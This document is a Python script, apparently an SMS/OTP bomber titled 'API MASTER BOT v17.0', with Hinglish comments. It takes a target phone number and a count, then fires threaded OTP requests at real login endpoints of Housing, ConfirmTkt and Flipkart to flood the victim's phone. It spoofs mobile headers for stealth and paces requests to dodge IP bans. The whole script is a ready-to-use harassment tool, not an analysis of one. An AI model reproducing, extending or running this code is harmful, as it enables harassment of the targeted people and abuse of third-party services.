import requests
import os
import time
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0

# ---------------------------------------------------------
# API DATABASE (Yahan Laptop se nikale huye links dalo)
# ---------------------------------------------------------
SMS_APIS = [
    {
        "name": "Housing", 
        "method": "POST", 
        "url": "https://login.housing.com/api/v2/send-otp", 
        "json": {"phone": "{target}"}
    },
    {
        "name": "ConfirmTkt", 
        "method": "GET", 
        "url": "https://securedapi.confirmtkt.com/api/platform/register", 
        "params": {"newOtp": "true", "mobileNumber": "{target}"}
    },
    {
        "name": "Flipkart", 
        "method": "POST", 
        "url": "https://rome.api.flipkart.com/api/7/user/otp/generate", 
        "json": {"loginId": "+91{target}"}
    }
    # <-- Laptop se nikala naya API yahan paste karo -->
]

def send_otp(api, target):
    global success_count, failed_count
    # Stealth Headers (Website ko lagega asli mobile hai)
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Referer": api["url"]
    }
    
    try:
        url = api["url"].replace("{target}", target)
        
        # Data Replacement Logic
        json_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("json", {}).items()} if "json" in api else None
        params_p = {k: v.replace("{target}", target) if isinstance(v, str) else v for k, v in api.get("params", {}).items()} if "params" in api else None

        if api["method"] == "GET":
            res = requests.get(url, params=params_p, headers=headers, timeout=10)
        else:
            res = requests.post(url, json=json_p, headers=headers, timeout=10)

        if res.status_code in [200, 201, 202]:
            success_count += 1
            print(f"{G}[+] SUCCESS: {api['name']}{W}")
        else:
            failed_count += 1
    except:
        failed_count += 1

def main():
    os.system("clear")
    print(f"{G}========================================")
    print("      🚀 API MASTER BOT v17.0         ")
    print(f"========================================{W}\n")
    
    target = input(f"{G}Enter Target Number: {W}")
    limit = int(input(f"{G}Enter Limit: {W}"))
    
    print(f"\n{Y}[*] Starting Attack on {target}...{W}\n")
    
    sent = 0
    while sent < limit:
        threads = []
        for api in SMS_APIS:
            if sent >= limit: break
            t = threading.Thread(target=send_otp, args=(api, target))
            t.start()
            threads.append(t)
            sent += 1
        
        for t in threads: t.join()
        time.sleep(1) # IP Ban se bachne ke liye gap

    print(f"\n{G}--- FINAL REPORT ---")
    print(f"Successfully Sent: {success_count}")
    print(f"Failed           : {failed_count}")
    print(f"====================={W}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{R}Stopped.{W}")
